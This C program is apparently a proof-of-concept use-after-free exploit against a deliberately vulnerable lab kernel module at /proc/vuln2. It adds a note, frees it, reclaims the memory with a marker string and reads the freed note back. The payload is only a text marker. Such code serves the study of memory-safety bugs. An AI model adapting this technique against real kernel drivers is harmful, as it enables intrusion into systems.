#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define PROC_PATH "/proc/vuln2"

// Function to add a note
int add_note(int fd, const char *content) {
    char *buffer = malloc(strlen(content) + 2);
    buffer[0] = 'A';  // Add command
    strcpy(buffer + 1, content);
    
    int ret = write(fd, buffer, strlen(content) + 1);
    free(buffer);
    return ret;
}

// Function to free a note
int free_note(int fd, int note_id) {
    char cmd = 'F';  // Free command
    write(fd, &cmd, 1);
    write(fd, &note_id, sizeof(int));
    return 0;
}

// Function to read a note
int read_note(int fd, int note_id) {
    char cmd = 'R';  // Read command
    write(fd, &cmd, 1);
    write(fd, &note_id, sizeof(int));
    return 0;
}

int main() {
    int fd;
    char buffer[256];
    
    printf("Starting exploitation...\n");
    
    fd = open(PROC_PATH, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // Create first note
    printf("Creating note 0...\n");
    add_note(fd, "Note 0 content");

    // Free the note
    printf("Freeing note 0...\n");
    free_note(fd, 0);

    // Create new note with exploitation marker
    printf("Creating note with exploitation marker...\n");
    add_note(fd, "EXP - Exploitation successful!");

    // Try to read the freed note
    printf("Reading freed note...\n");
    read_note(fd, 0);

    // Check if exploitation was successful
    printf("Checking exploitation status...\n");
    lseek(fd, 0, SEEK_SET);
    memset(buffer, 0, sizeof(buffer));
    read(fd, buffer, sizeof(buffer));
    printf("Result: %s\n", buffer);

    close(fd);
    return 0;
}
